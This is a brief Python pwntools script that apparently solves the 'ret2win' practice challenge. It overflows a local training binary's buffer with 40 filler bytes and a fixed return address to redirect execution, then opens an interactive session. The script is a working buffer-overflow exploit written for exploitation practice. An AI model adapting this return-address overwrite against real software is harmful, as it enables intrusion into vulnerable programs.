#!/usr/bin/env python3

# Exploit script for ret2win

from pwn import *


io = process('./ret2win')

io.recvuntil(b'> ')

payload = flat([
	b'A'*40,
	p64(0x400756)
	])
print(payload)
io.sendline(payload)


io.interactive()